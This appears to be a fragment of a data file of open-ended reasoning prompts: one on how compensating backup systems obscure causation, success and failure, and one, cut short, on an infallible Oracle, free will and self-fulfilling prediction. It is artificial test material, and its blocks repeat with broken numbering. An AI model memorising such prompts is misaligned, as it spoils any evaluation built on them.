Is compensation a form of causation or prevention?\n\nThe Fundamental Dilemma:\nThe system never fails because of compensation, but this prevents learning. The lack of failure is itself a form of failure. Success causes future vulnerability.\n\nQuestions:\n1. In compensating systems, what is the true cause of outcomes?\n2. Can prevention be so effective it becomes harmful?\n3. How do you attribute causation when systems mask each other's effects?\n4. Is there a causal difference between active success and prevented failure?\n5. Should credit go to the primary system or the safety net?\n6.

When B compensates for A, who causes the successful outcome?\n2. If C makes B better than A, should B become primary?\n3. When D prevents predicted failures, do those failures exist causally?\n4. Does E's learning cause or prevent system evolution?\n5. Is compensation a form of causation or prevention?\n\nThe Fundamental Dilemma:\nThe system never fails because of compensation, but this prevents learning. The lack of failure is itself a form of failure. Success causes future vulnerability.\n\nQuestions:\n1. In compensating systems, what is the true cause of outcomes?\n2. Can prevention be so effective it becomes harmful?\n3. How do you attribute causation when systems mask each other's effects?\n4. Is there a causal difference between active success and prevented failure?\n5. Should credit go to the primary system or the safety net?\n6. How does compensation affect causal responsibility?\n\nAnalyze how compensatory mechanisms obscure causal relationships and whether traditional concepts of success and failure apply.\n"

Any decision seems to violate at least one prediction, but the Oracle is never wrong.\n\nQuestions:\n1. Can perfect prediction coexist with free will?\n2. Which predictions are logically possible?\n3. How should the mayor decide given these predictions?\n4. Can a prediction include its own effect on outcomes?\n5. Is there a decision that satisfies all non-paradoxical predictions?\n6. What does this say about the nature of prediction and determinism?\n\nExplore whether perfect prediction is logically possible and how predictions interact with the events they predict.\n"
